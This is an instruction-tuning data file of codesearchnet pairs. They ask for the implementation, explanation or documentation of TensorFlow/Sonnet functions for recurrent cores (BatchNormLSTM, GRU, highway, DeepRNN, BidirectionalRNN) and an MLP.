{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild the default start state tensor of zeros.", "response": "def initial_state(self, batch_size, dtype=tf.float32, trainable=False,\n                    trainable_initializers=None, trainable_regularizers=None,\n                    name=None):\n    \"\"\"Builds the default start state tensor of zeros.\"\"\"\n    core_initial_state = self._core.initial_state(\n        batch_size, dtype=dtype, trainable=trainable,\n        trainable_initializers=trainable_initializers,\n        trainable_regularizers=trainable_regularizers, name=name)\n\n    dropout_masks = [None] * len(self._dropout_state_size)\n    def set_dropout_mask(index, state, keep_prob):\n      if index is not None:\n        ones = tf.ones_like(state, dtype=dtype)\n        dropout_masks[index] = tf.nn.dropout(ones, keep_prob=keep_prob)\n    tf.contrib.framework.nest.map_structure(\n        set_dropout_mask,\n        self._dropout_indexes, core_initial_state, self._keep_probs)\n\n    return core_initial_state, dropout_masks"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef initial_state(self, batch_size, dtype=tf.float32, trainable=False,\n                    trainable_initializers=None, trainable_regularizers=None,\n                    name=None):\n    \"\"\"Builds the default start state tensor of zeros.\"\"\"\n    return self._core.initial_state(\n        batch_size, dtype=dtype, trainable=trainable,\n        trainable_initializers=trainable_initializers,\n        trainable_regularizers=trainable_regularizers, name=name)", "response": "Builds the default start state tensor of zeros."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nwrapping this RNNCore with the additional input to the BatchNorm LSTM.", "response": "def with_batch_norm_control(self, is_training, test_local_stats=True):\n    \"\"\"Wraps this RNNCore with the additional control input to the `BatchNorm`s.\n\n    Example usage:\n\n      lstm = snt.BatchNormLSTM(4)\n      is_training = tf.placeholder(tf.bool)\n      rnn_input = ...\n      my_rnn = rnn.rnn(lstm.with_batch_norm_control(is_training), rnn_input)\n\n    Args:\n      is_training: Boolean that indicates whether we are in\n        training mode or testing mode. When in training mode, the batch norm\n        statistics are taken from the given batch, and moving statistics are\n        updated. When in testing mode, the moving statistics are not updated,\n        and in addition if `test_local_stats` is False then the moving\n        statistics are used for the batch statistics. See the `BatchNorm` module\n        for more details.\n      test_local_stats: Boolean scalar indicated whether to use local\n        batch statistics in test mode.\n\n    Returns:\n      snt.RNNCore wrapping this class with the extra input(s) added.\n    \"\"\"\n    return BatchNormLSTM.CoreWithExtraBuildArgs(\n        self, is_training=is_training, test_local_stats=test_local_stats)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_possible_initializer_keys(\n      cls, use_peepholes=False, use_batch_norm_h=True, use_batch_norm_x=False,\n      use_batch_norm_c=False):\n    \"\"\"Returns the keys the dictionary of variable initializers may contain.\n\n    The set of all possible initializer keys are:\n      w_gates:  weight for gates\n      b_gates:  bias of gates\n      w_f_diag: weight for prev_cell -> forget gate peephole\n      w_i_diag: weight for prev_cell -> input gate peephole\n      w_o_diag: weight for prev_cell -> output gate peephole\n      gamma_h:  batch norm scaling for previous_hidden -> gates\n      gamma_x:  batch norm scaling for input -> gates\n      gamma_c:  batch norm scaling for cell -> output\n      beta_c:   batch norm bias for cell -> output\n\n    Args:\n      cls:The class.\n      use_peepholes: Boolean that indicates whether peephole connections are\n        used.\n      use_batch_norm_h: Boolean that indicates whether to apply batch\n        normalization at the previous_hidden -> gates contribution. If you are\n        experimenting with batch norm then this may be the most effective to\n        turn on.\n      use_batch_norm_x: Boolean that indicates whether to apply batch\n        normalization at the input -> gates contribution.\n      use_batch_norm_c: Boolean that indicates whether to apply batch\n        normalization at the cell -> output contribution.\n\n    Returns:\n      Set with strings corresponding to the strings that may be passed to the\n        constructor.\n    \"\"\"\n\n    possible_keys = cls.POSSIBLE_INITIALIZER_KEYS.copy()\n    if not use_peepholes:\n      possible_keys.difference_update(\n          {cls.W_F_DIAG, cls.W_I_DIAG, cls.W_O_DIAG})\n    if not use_batch_norm_h:\n      possible_keys.remove(cls.GAMMA_H)\n    if not use_batch_norm_x:\n      possible_keys.remove(cls.GAMMA_X)\n    if not use_batch_norm_c:\n      possible_keys.difference_update({cls.GAMMA_C, cls.BETA_C})\n    return possible_keys", "response": "Returns the set of possible initialization keys for the given class."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _build(self, inputs, prev_state, is_training=None, test_local_stats=True):\n    if is_training is None:\n      raise ValueError(\"Boolean is_training flag must be explicitly specified \"\n                       \"when using batch normalization.\")\n\n    if self._max_unique_stats == 1:\n      prev_hidden, prev_cell = prev_state\n      time_step = None\n    else:\n      prev_hidden, prev_cell, time_step = prev_state\n\n    # pylint: disable=invalid-unary-operand-type\n    if self._hidden_clip_value is not None:\n      prev_hidden = tf.clip_by_value(\n          prev_hidden, -self._hidden_clip_value, self._hidden_clip_value)\n    if self._cell_clip_value is not None:\n      prev_cell = tf.clip_by_value(\n          prev_cell, -self._cell_clip_value, self._cell_clip_value)\n    # pylint: enable=invalid-unary-operand-type\n\n    self._create_gate_variables(inputs.get_shape(), inputs.dtype)\n    self._create_batch_norm_variables(inputs.dtype)\n\n    # pylint false positive: calling module of same file;\n    # pylint: disable=not-callable\n\n    if self._use_batch_norm_h or self._use_batch_norm_x:\n      gates_h = tf.matmul(prev_hidden, self._w_h)\n      gates_x = tf.matmul(inputs, self._w_x)\n      if self._use_batch_norm_h:\n        gates_h = self._gamma_h * self._batch_norm_h(gates_h,\n                                                     time_step,\n                                                     is_training,\n                                                     test_local_stats)\n      if self._use_batch_norm_x:\n        gates_x = self._gamma_x * self._batch_norm_x(gates_x,\n                                                     time_step,\n                                                     is_training,\n                                                     test_local_stats)\n      gates = gates_h + gates_x\n    else:\n      # Parameters of gates are concatenated into one multiply for efficiency.\n      inputs_and_hidden = tf.concat([inputs, prev_hidden], 1)\n      gates = tf.matmul(inputs_and_hidden, self._w_xh)\n\n    gates += self._b\n\n    # i = input_gate, j = next_input, f = forget_gate, o = output_gate\n    i, j, f, o = tf.split(value=gates, num_or_size_splits=4, axis=1)\n\n    if self._use_peepholes:  # diagonal connections\n      self._create_peephole_variables(inputs.dtype)\n      f += self._w_f_diag * prev_cell\n      i += self._w_i_diag * prev_cell\n\n    forget_mask = tf.sigmoid(f + self._forget_bias)\n    next_cell = forget_mask * prev_cell + tf.sigmoid(i) * tf.tanh(j)\n    cell_output = next_cell\n    if self._use_batch_norm_c:\n      cell_output = (self._beta_c\n                     + self._gamma_c * self._batch_norm_c(cell_output,\n                                                          time_step,\n                                                          is_training,\n                                                          test_local_stats))\n    if self._use_peepholes:\n      cell_output += self._w_o_diag * cell_output\n    next_hidden = tf.tanh(cell_output) * tf.sigmoid(o)\n\n    if self._max_unique_stats == 1:\n      return next_hidden, (next_hidden, next_cell)\n    else:\n      return next_hidden, (next_hidden, next_cell, time_step + 1)", "response": "Connects the LSTM module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _create_batch_norm_variables(self, dtype):\n    # The paper recommends a value of 0.1 for good gradient flow through the\n    # tanh nonlinearity (although doesn't say whether this is for all gammas,\n    # or just some).\n    gamma_initializer = tf.constant_initializer(0.1)\n\n    if self._use_batch_norm_h:\n      self._gamma_h = tf.get_variable(\n          self.GAMMA_H,\n          shape=[4 * self._hidden_size],\n          dtype=dtype,\n          initializer=self._initializers.get(self.GAMMA_H, gamma_initializer),\n          partitioner=self._partitioners.get(self.GAMMA_H),\n          regularizer=self._regularizers.get(self.GAMMA_H))\n    if self._use_batch_norm_x:\n      self._gamma_x = tf.get_variable(\n          self.GAMMA_X,\n          shape=[4 * self._hidden_size],\n          dtype=dtype,\n          initializer=self._initializers.get(self.GAMMA_X, gamma_initializer),\n          partitioner=self._partitioners.get(self.GAMMA_X),\n          regularizer=self._regularizers.get(self.GAMMA_X))\n    if self._use_batch_norm_c:\n      self._gamma_c = tf.get_variable(\n          self.GAMMA_C,\n          shape=[self._hidden_size],\n          dtype=dtype,\n          initializer=self._initializers.get(self.GAMMA_C, gamma_initializer),\n          partitioner=self._partitioners.get(self.GAMMA_C),\n          regularizer=self._regularizers.get(self.GAMMA_C))\n      self._beta_c = tf.get_variable(\n          self.BETA_C,\n          shape=[self._hidden_size],\n          dtype=dtype,\n          initializer=self._initializers.get(self.BETA_C),\n          partitioner=self._partitioners.get(self.BETA_C),\n          regularizer=self._regularizers.get(self.BETA_C))", "response": "Initialize the variables used for the BatchNorms."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ninitializes the variables used for the gates.", "response": "def _create_gate_variables(self, input_shape, dtype):\n    \"\"\"Initialize the variables used for the gates.\"\"\"\n    if len(input_shape) != 2:\n      raise ValueError(\n          \"Rank of shape must be {} not: {}\".format(2, len(input_shape)))\n    input_size = input_shape.dims[1].value\n\n    b_shape = [4 * self._hidden_size]\n\n    equiv_input_size = self._hidden_size + input_size\n    initializer = basic.create_linear_initializer(equiv_input_size)\n\n    if self._use_batch_norm_h or self._use_batch_norm_x:\n      self._w_h = tf.get_variable(\n          self.W_GATES + \"_H\",\n          shape=[self._hidden_size, 4 * self._hidden_size],\n          dtype=dtype,\n          initializer=self._initializers.get(self.W_GATES, initializer),\n          partitioner=self._partitioners.get(self.W_GATES),\n          regularizer=self._regularizers.get(self.W_GATES))\n      self._w_x = tf.get_variable(\n          self.W_GATES + \"_X\",\n          shape=[input_size, 4 * self._hidden_size],\n          dtype=dtype,\n          initializer=self._initializers.get(self.W_GATES, initializer),\n          partitioner=self._partitioners.get(self.W_GATES),\n          regularizer=self._regularizers.get(self.W_GATES))\n    else:\n      self._w_xh = tf.get_variable(\n          self.W_GATES,\n          shape=[self._hidden_size + input_size, 4 * self._hidden_size],\n          dtype=dtype,\n          initializer=self._initializers.get(self.W_GATES, initializer),\n          partitioner=self._partitioners.get(self.W_GATES),\n          regularizer=self._regularizers.get(self.W_GATES))\n    self._b = tf.get_variable(\n        self.B_GATES,\n        shape=b_shape,\n        dtype=dtype,\n        initializer=self._initializers.get(self.B_GATES, initializer),\n        partitioner=self._partitioners.get(self.B_GATES),\n        regularizer=self._regularizers.get(self.B_GATES))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef initial_state(self, batch_size, dtype=tf.float32, trainable=False,\n                    trainable_initializers=None, trainable_regularizers=None,\n                    name=None):\n    \"\"\"Builds the default start state tensor of zeros.\n\n    Args:\n      batch_size: An int, float or scalar Tensor representing the batch size.\n      dtype: The data type to use for the state.\n      trainable: Boolean that indicates whether to learn the initial state.\n      trainable_initializers: An optional pair of initializers for the\n          initial hidden state and cell state.\n      trainable_regularizers: Optional regularizer function or nested structure\n        of functions with the same structure as the `state_size` property of the\n        core, to be used as regularizers of the initial state variable. A\n        regularizer should be a function that takes a single `Tensor` as an\n        input and returns a scalar `Tensor` output, e.g. the L1 and L2\n        regularizers in `tf.contrib.layers`.\n      name: Optional string used to prefix the initial state variable names, in\n          the case of a trainable initial state. If not provided, defaults to\n          the name of the module.\n\n    Returns:\n      A tensor tuple `([batch_size, state_size], [batch_size, state_size], ?)`\n      filled with zeros, with the third entry present when batch norm is enabled\n      with `max_unique_stats > 1', with value `0` (representing the time step).\n    \"\"\"\n    if self._max_unique_stats == 1:\n      return super(BatchNormLSTM, self).initial_state(\n          batch_size, dtype=dtype, trainable=trainable,\n          trainable_initializers=trainable_initializers,\n          trainable_regularizers=trainable_regularizers, name=name)\n    else:\n      with tf.name_scope(self._initial_state_scope(name)):\n        if not trainable:\n          state = self.zero_state(batch_size, dtype)\n        else:\n          # We have to manually create the state ourselves so we don't create a\n          # variable that never gets used for the third entry.\n          state = rnn_core.trainable_initial_state(\n              batch_size,\n              (tf.TensorShape([self._hidden_size]),\n               tf.TensorShape([self._hidden_size])),\n              dtype=dtype,\n              initializers=trainable_initializers,\n              regularizers=trainable_regularizers,\n              name=self._initial_state_scope(name))\n        return (state[0], state[1], tf.constant(0, dtype=tf.int32))", "response": "Builds the default start state tensor for the batch norm."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef state_size(self):\n    if self._max_unique_stats == 1:\n      return (tf.TensorShape([self._hidden_size]),\n              tf.TensorShape([self._hidden_size]))\n    else:\n      return (tf.TensorShape([self._hidden_size]),\n              tf.TensorShape([self._hidden_size]),\n              tf.TensorShape(1))", "response": "Tuple of tf. TensorShape s indicating the size of state tensors."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a new convolution.", "response": "def _new_convolution(self, use_bias):\n    \"\"\"Returns new convolution.\n\n    Args:\n      use_bias: Use bias in convolutions. If False, clean_dict removes bias\n        entries from initializers, partitioners and regularizers passed to\n        the constructor of the convolution.\n    \"\"\"\n    def clean_dict(input_dict):\n      if input_dict and not use_bias:\n        cleaned_dict = input_dict.copy()\n        cleaned_dict.pop(\"b\", None)\n        return cleaned_dict\n      return input_dict\n    return self._conv_class(\n        output_channels=4*self._output_channels,\n        kernel_shape=self._kernel_shape,\n        stride=self._stride,\n        rate=self._rate,\n        padding=self._padding,\n        use_bias=use_bias,\n        initializers=clean_dict(self._initializers),\n        partitioners=clean_dict(self._partitioners),\n        regularizers=clean_dict(self._regularizers),\n        name=\"conv\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _build(self, inputs, prev_state):\n    input_size = inputs.get_shape()[1]\n    weight_shape = (input_size, self._hidden_size)\n    u_shape = (self._hidden_size, self._hidden_size)\n    bias_shape = (self._hidden_size,)\n\n    self._wz = tf.get_variable(GRU.WZ, weight_shape, dtype=inputs.dtype,\n                               initializer=self._initializers.get(GRU.WZ),\n                               partitioner=self._partitioners.get(GRU.WZ),\n                               regularizer=self._regularizers.get(GRU.WZ))\n    self._uz = tf.get_variable(GRU.UZ, u_shape, dtype=inputs.dtype,\n                               initializer=self._initializers.get(GRU.UZ),\n                               partitioner=self._partitioners.get(GRU.UZ),\n                               regularizer=self._regularizers.get(GRU.UZ))\n    self._bz = tf.get_variable(GRU.BZ, bias_shape, dtype=inputs.dtype,\n                               initializer=self._initializers.get(GRU.BZ),\n                               partitioner=self._partitioners.get(GRU.BZ),\n                               regularizer=self._regularizers.get(GRU.BZ))\n    z = tf.sigmoid(tf.matmul(inputs, self._wz) +\n                   tf.matmul(prev_state, self._uz) + self._bz)\n\n    self._wr = tf.get_variable(GRU.WR, weight_shape, dtype=inputs.dtype,\n                               initializer=self._initializers.get(GRU.WR),\n                               partitioner=self._partitioners.get(GRU.WR),\n                               regularizer=self._regularizers.get(GRU.WR))\n    self._ur = tf.get_variable(GRU.UR, u_shape, dtype=inputs.dtype,\n                               initializer=self._initializers.get(GRU.UR),\n                               partitioner=self._partitioners.get(GRU.UR),\n                               regularizer=self._regularizers.get(GRU.UR))\n    self._br = tf.get_variable(GRU.BR, bias_shape, dtype=inputs.dtype,\n                               initializer=self._initializers.get(GRU.BR),\n                               partitioner=self._partitioners.get(GRU.BR),\n                               regularizer=self._regularizers.get(GRU.BR))\n    r = tf.sigmoid(tf.matmul(inputs, self._wr) +\n                   tf.matmul(prev_state, self._ur) + self._br)\n\n    self._wh = tf.get_variable(GRU.WH, weight_shape, dtype=inputs.dtype,\n                               initializer=self._initializers.get(GRU.WH),\n                               partitioner=self._partitioners.get(GRU.WH),\n                               regularizer=self._regularizers.get(GRU.WH))\n    self._uh = tf.get_variable(GRU.UH, u_shape, dtype=inputs.dtype,\n                               initializer=self._initializers.get(GRU.UH),\n                               partitioner=self._partitioners.get(GRU.UH),\n                               regularizer=self._regularizers.get(GRU.UH))\n    self._bh = tf.get_variable(GRU.BH, bias_shape, dtype=inputs.dtype,\n                               initializer=self._initializers.get(GRU.BH),\n                               partitioner=self._partitioners.get(GRU.BH),\n                               regularizer=self._regularizers.get(GRU.BH))\n    h_twiddle = tf.tanh(tf.matmul(inputs, self._wh) +\n                        tf.matmul(r * prev_state, self._uh) + self._bh)\n\n    state = (1 - z) * prev_state + z * h_twiddle\n    return state, state", "response": "Connects the GRU module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_possible_initializer_keys(cls, num_layers):\n    keys = [cls.WT, cls.WH]\n    for layer_index in xrange(num_layers):\n      layer_str = str(layer_index)\n      keys += [\n          cls.WT + layer_str,\n          cls.BT + layer_str,\n          cls.WH + layer_str,\n          cls.BH + layer_str]\n    return set(keys)", "response": "Returns the set of possible variable initializers that may be passed to the base class constructor."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconnects the highway core module into the graph.", "response": "def _build(self, inputs, prev_state):\n    \"\"\"Connects the highway core module into the graph.\n\n    Args:\n      inputs: Tensor of size `[batch_size, input_size]`.\n      prev_state: Tensor of size `[batch_size, hidden_size]`.\n\n    Returns:\n      A tuple (output, next_state) where `output` is a Tensor of size\n      `[batch_size, hidden_size]` and `next_state` is a Tensor of size\n      `[batch_size, hidden_size]`.\n\n    Raises:\n      ValueError: If connecting the module into the graph any time after the\n        first time, and the inferred size of the inputs does not match previous\n        invocations.\n    \"\"\"\n    input_size = inputs.get_shape()[1]\n    weight_shape = (input_size, self._hidden_size)\n    u_shape = (self._hidden_size, self._hidden_size)\n    bias_shape = (self._hidden_size,)\n\n    def _get_variable(name, shape):\n      return tf.get_variable(\n          name,\n          shape,\n          dtype=inputs.dtype,\n          initializer=self._initializers.get(name),\n          partitioner=self._partitioners.get(name),\n          regularizer=self._regularizers.get(name))\n\n    pre_highway_wt = _get_variable(self.WT, weight_shape)\n    pre_highway_wh = _get_variable(self.WH, weight_shape)\n    state = prev_state\n    for layer_index in xrange(self._num_layers):\n      layer_str = str(layer_index)\n      layer_wt = _get_variable(self.WT + layer_str, u_shape)\n      layer_bt = _get_variable(self.BT + layer_str, bias_shape)\n      layer_wh = _get_variable(self.WH + layer_str, u_shape)\n      layer_bh = _get_variable(self.BH + layer_str, bias_shape)\n      linear_t = tf.matmul(state, layer_wt) + layer_bt\n      linear_h = tf.matmul(state, layer_wh) + layer_bh\n      if layer_index == 0:\n        linear_t += tf.matmul(inputs, pre_highway_wt)\n        linear_h += tf.matmul(inputs, pre_highway_wh)\n      output_t = tf.sigmoid(linear_t)\n      output_h = tf.tanh(linear_h)\n      state = state * (1 - output_t) + output_h * output_t\n\n    return state, state"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the list flattened output sizes of a list of cores.", "response": "def _get_flat_core_sizes(cores):\n  \"\"\"Obtains the list flattened output sizes of a list of cores.\n\n  Args:\n    cores: list of cores to get the shapes from.\n\n  Returns:\n    List of lists that, for each core, contains the list of its output\n      dimensions.\n  \"\"\"\n  core_sizes_lists = []\n  for core in cores:\n    flat_output_size = nest.flatten(core.output_size)\n    core_sizes_lists.append(\n        [tf.TensorShape(size).as_list() for size in flat_output_size])\n  return core_sizes_lists"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconverting a Tensor nest to a TensorShape nest removing batch dimension.", "response": "def _get_shape_without_batch_dimension(tensor_nest):\n  \"\"\"Converts Tensor nest to a TensorShape nest, removing batch dimension.\"\"\"\n  def _strip_batch_and_convert_to_shape(tensor):\n    return tensor.get_shape()[1:]\n  return nest.map_structure(_strip_batch_and_convert_to_shape, tensor_nest)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _build(self, input_, prev_state):\n    self._in_to_hidden_linear = basic.Linear(\n        self._hidden_size, name=\"in_to_hidden\",\n        initializers=self._initializers.get(\"in_to_hidden\"),\n        partitioners=self._partitioners.get(\"in_to_hidden\"),\n        regularizers=self._regularizers.get(\"in_to_hidden\"))\n\n    self._hidden_to_hidden_linear = basic.Linear(\n        self._hidden_size, name=\"hidden_to_hidden\",\n        initializers=self._initializers.get(\"hidden_to_hidden\"),\n        partitioners=self._partitioners.get(\"hidden_to_hidden\"),\n        regularizers=self._regularizers.get(\"hidden_to_hidden\"))\n\n    in_to_hidden = self._in_to_hidden_linear(input_)\n    hidden_to_hidden = self._hidden_to_hidden_linear(prev_state)\n    output = self._activation(in_to_hidden + hidden_to_hidden)\n\n    # For VanillaRNN, the next state of the RNN is the same as the output\n    return output, output", "response": "Connects the VanillaRNN module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _check_cores_output_sizes(self):\n    for core_sizes in zip(*tuple(_get_flat_core_sizes(self._cores))):\n      first_core_list = core_sizes[0][1:]\n      for i, core_list in enumerate(core_sizes[1:]):\n        if core_list[1:] != first_core_list:\n          raise ValueError(\"The outputs of the provided cores are not able \"\n                           \"to be concatenated along the first feature \"\n                           \"dimension. Core 0 has shape %s, whereas Core %d \"\n                           \"has shape %s - these must only differ in the first \"\n                           \"dimension\" % (core_sizes[0], i + 1, core_list))", "response": "Checks the output_sizes of the cores of the DeepRNN module."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _build(self, inputs, prev_state, **kwargs):\n    current_input = inputs\n    next_states = []\n    outputs = []\n    recurrent_idx = 0\n    concatenate = lambda *args: tf.concat(args, axis=-1)\n    for i, core in enumerate(self._cores):\n      if self._skip_connections and i > 0:\n        current_input = nest.map_structure(concatenate, inputs, current_input)\n\n      # Determine if this core in the stack is recurrent or not and call\n      # accordingly.\n      if self._is_recurrent_list[i]:\n        current_input, next_state = core(current_input,\n                                         prev_state[recurrent_idx],\n                                         **kwargs)\n        next_states.append(next_state)\n        recurrent_idx += 1\n      else:\n        current_input = core(current_input, **kwargs)\n\n      if self._skip_connections:\n        outputs.append(current_input)\n\n    if self._skip_connections and self._concat_final_output_if_skip:\n      output = nest.map_structure(concatenate, *outputs)\n    else:\n      output = current_input\n\n    self._last_output_size = _get_shape_without_batch_dimension(output)\n    return output, tuple(next_states)", "response": "Connects the DeepRNN module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild the default start state for a DeepRNN.", "response": "def initial_state(self, batch_size, dtype=tf.float32, trainable=False,\n                    trainable_initializers=None, trainable_regularizers=None,\n                    name=None):\n    \"\"\"Builds the default start state for a DeepRNN.\n\n    Args:\n      batch_size: An int, float or scalar Tensor representing the batch size.\n      dtype: The data type to use for the state.\n      trainable: Boolean that indicates whether to learn the initial state.\n      trainable_initializers: An initializer function or nested structure of\n          functions with same structure as the `state_size` property of the\n          core, to be used as initializers of the initial state variable.\n      trainable_regularizers: Optional regularizer function or nested structure\n        of functions with the same structure as the `state_size` property of the\n        core, to be used as regularizers of the initial state variable. A\n        regularizer should be a function that takes a single `Tensor` as an\n        input and returns a scalar `Tensor` output, e.g. the L1 and L2\n        regularizers in `tf.contrib.layers`.\n      name: Optional string used to prefix the initial state variable names, in\n          the case of a trainable initial state. If not provided, defaults to\n          the name of the module.\n\n    Returns:\n      A tensor or nested tuple of tensors with same structure and shape as the\n      `state_size` property of the core.\n\n    Raises:\n      ValueError: if the number of passed initializers is not the same as the\n          number of recurrent cores.\n    \"\"\"\n    initial_state = []\n    if trainable_initializers is None:\n      trainable_initializers = [None] * self._num_recurrent\n    if trainable_regularizers is None:\n      trainable_regularizers = [None] * self._num_recurrent\n\n    num_initializers = len(trainable_initializers)\n\n    if num_initializers != self._num_recurrent:\n      raise ValueError(\"The number of initializers and recurrent cores should \"\n                       \"be the same. Received %d initializers for %d specified \"\n                       \"recurrent cores.\"\n                       % (num_initializers, self._num_recurrent))\n\n    with tf.name_scope(self._initial_state_scope(name)):\n      recurrent_idx = 0\n      for is_recurrent, core in zip(self._is_recurrent_list, self._cores):\n        if is_recurrent:\n          core_initial_state = core.initial_state(\n              batch_size, dtype=dtype, trainable=trainable,\n              trainable_initializers=trainable_initializers[recurrent_idx],\n              trainable_regularizers=trainable_regularizers[recurrent_idx])\n          initial_state.append(core_initial_state)\n          recurrent_idx += 1\n    return tuple(initial_state)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconnect the ModelRNN module into the graph.", "response": "def _build(self, inputs, prev_state):\n    \"\"\"Connects the ModelRNN module into the graph.\n\n    If this is not the first time the module has been connected to the graph,\n    the Tensors provided as input_ and state must have the same final\n    dimension, in order for the existing variables to be the correct size for\n    their corresponding multiplications. The batch size may differ for each\n    connection.\n\n    Args:\n      inputs: Tensor input to the ModelRNN (ignored).\n      prev_state: Tensor of size `model.output_size`.\n\n    Returns:\n      output: Tensor of size `model.output_size`.\n      next_state: Tensor of size `model.output_size`.\n    \"\"\"\n    next_state = self._model(prev_state)\n\n    # For ModelRNN, the next state of the RNN is the same as the output\n    return next_state, next_state"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _build(self, input_sequence, state):\n    input_shape = input_sequence.get_shape()\n    if input_shape[0] is None:\n      raise ValueError(\"Time dimension of input (dim 0) must be statically\"\n                       \"known.\")\n    seq_length = int(input_shape[0])\n    forward_state, backward_state = state\n\n    # Lists for the forward backward output and state.\n    output_sequence_f = []\n    output_sequence_b = []\n\n    # Forward pass over the sequence.\n    with tf.name_scope(\"forward_rnn\"):\n      core_state = forward_state\n      for i in six.moves.range(seq_length):\n        core_output, core_state = self._forward_core(\n            input_sequence[i, :,], core_state)\n\n        output_sequence_f.append((core_output, core_state))\n\n      output_sequence_f = nest.map_structure(\n          lambda *vals: tf.stack(vals), *output_sequence_f)\n\n    # Backward pass over the sequence.\n    with tf.name_scope(\"backward_rnn\"):\n      core_state = backward_state\n      for i in six.moves.range(seq_length - 1, -1, -1):\n        core_output, core_state = self._backward_core(\n            input_sequence[i, :,], core_state)\n\n        output_sequence_b.append((core_output, core_state))\n\n      output_sequence_b = nest.map_structure(\n          lambda *vals: tf.stack(vals), *output_sequence_b)\n\n    # Compose the full output and state sequeneces.\n    return {\n        \"outputs\": {\n            \"forward\": output_sequence_f[0],\n            \"backward\": output_sequence_b[0]\n        },\n        \"state\": {\n            \"forward\": output_sequence_f[1],\n            \"backward\": output_sequence_b[1]\n        }\n    }", "response": "Connects the BidirectionalRNN module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef initial_state(self, batch_size, dtype=tf.float32, trainable=False,\n                    trainable_initializers=None, trainable_regularizers=None,\n                    name=None):\n    \"\"\"Builds the default start state for a BidirectionalRNN.\n\n    The Bidirectional RNN flattens the states of its forward and backward cores\n    and concatentates them.\n\n    Args:\n      batch_size: An int, float or scalar Tensor representing the batch size.\n      dtype: The data type to use for the state.\n      trainable: Boolean that indicates whether to learn the initial state.\n      trainable_initializers: An initializer function or nested structure of\n          functions with same structure as the `state_size` property of the\n          core, to be used as initializers of the initial state variable.\n      trainable_regularizers: Optional regularizer function or nested structure\n        of functions with the same structure as the `state_size` property of the\n        core, to be used as regularizers of the initial state variable. A\n        regularizer should be a function that takes a single `Tensor` as an\n        input and returns a scalar `Tensor` output, e.g. the L1 and L2\n        regularizers in `tf.contrib.layers`.\n      name: Optional string used to prefix the initial state variable names, in\n          the case of a trainable initial state. If not provided, defaults to\n          the name of the module.\n\n    Returns:\n      Tuple of initial states from forward and backward RNNs.\n    \"\"\"\n    name = \"state\" if name is None else name\n    forward_initial_state = self._forward_core.initial_state(\n        batch_size, dtype, trainable, trainable_initializers,\n        trainable_regularizers, name=name+\"_forward\")\n    backward_initial_state = self._backward_core.initial_state(\n        batch_size, dtype, trainable, trainable_initializers,\n        trainable_regularizers, name=name+\"_backward\")\n    return forward_initial_state, backward_initial_state", "response": "Builds the default start state for a BidirectionalRNN."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _build(self, inputs, is_training=True, dropout_keep_prob=0.5):\n    self._input_shape = tuple(inputs.get_shape().as_list())\n    net = inputs\n\n    final_index = self._num_layers - 1\n    for layer_id in xrange(self._num_layers):\n      net = self._layers[layer_id](net)\n\n      if final_index != layer_id or self._activate_final:\n        # Only perform dropout whenever we are activating the layer's outputs.\n        if self._use_dropout:\n          keep_prob = utils.smart_cond(\n              is_training, true_fn=lambda: dropout_keep_prob,\n              false_fn=lambda: tf.constant(1.0)\n          )\n          net = tf.nn.dropout(net, keep_prob=keep_prob)\n        net = self._activation(net)\n\n    return net", "response": "Assembles the MLP and connects it to the graph."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef output_sizes(self):\n    return tuple([l() if callable(l) else l for l in self._output_sizes])", "response": "Returns a tuple of all the output sizes of all the layers."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a new MLP with the same parameters as the current one.", "response": "def transpose(self, name=None, activate_final=None):\n    \"\"\"Returns transposed `MLP`.\n\n    Args:\n      name: Optional string specifying the name of the transposed module. The\n        default name is constructed by appending \"_transpose\"\n        to `self.module_name`.\n      activate_final: Optional boolean determining if the activation and batch\n        normalization, if turned on, are applied to the final layer.\n\n    Returns:\n      Matching transposed `MLP` module.\n    \"\"\"\n    if name is None:\n      name = self.module_name + \"_transpose\"\n    if activate_final is None:\n      activate_final = self.activate_final\n    output_sizes = [lambda l=layer: l.input_shape[1] for layer in self._layers]\n    output_sizes.reverse()\n    return MLP(\n        name=name,\n        output_sizes=output_sizes,\n        activation=self.activation,\n        activate_final=activate_final,\n        initializers=self.initializers,\n        partitioners=self.partitioners,\n        regularizers=self.regularizers,\n        use_bias=self.use_bias,\n        use_dropout=self.use_dropout)"}
